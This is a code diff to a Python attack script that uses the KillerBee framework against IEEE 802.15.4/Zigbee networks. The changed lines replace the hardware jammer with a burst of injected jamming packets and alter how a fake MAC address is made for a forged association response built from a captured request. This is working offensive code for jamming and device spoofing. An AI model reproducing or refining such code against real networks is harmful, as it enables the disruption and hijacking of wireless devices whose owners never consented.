@@ -6,7 +6,6 @@ import sys
 import time
 
 from killerbee import *
-from kbutils import randmac
 
 BEACON_RESPONSE_LISTEN_TRIES = 10
 
@@ -99,9 +98,10 @@ if __name__ == '__main__':
 
         # Jam for 0.4 sec
         print('4. Jamming channel for ' + str(JAM_TIME_SEC) + ' seconds.')
-        kb.jammer_on()
-        time.sleep(JAM_TIME_SEC)
-        kb.jammer_off()
+        #kb.jammer_on()
+        kb.inject(JAM_PKT_BYTES, None, count=150, delay=0)
+        #time.sleep(JAM_TIME_SEC)
+        #kb.jammer_off()
 
         # Increment channel
         # TODO: Are channel scans incremental from 11 to 26?
@@ -149,7 +149,7 @@ if __name__ == '__main__':
         assoc_response_seq_num = assoc_request_pkt_bytes[2]+1
         assoc_response_dest_mac = assoc_request_pkt_bytes[8:17]
         assoc_response_dest_pan = assoc_request_pkt_bytes[3:5]
-        fake_mac_addr_bytes = bytearray(randmac())
+        fake_mac_addr_bytes = bytearray(kbutils.randmac())
         # 1. 2 bytes of frame info and sequence number (assoc request SN + 1)
         # 2. Destination PAN (extracted from assoc request)
         # 3. Destination MAC address (extracted from assoc request)
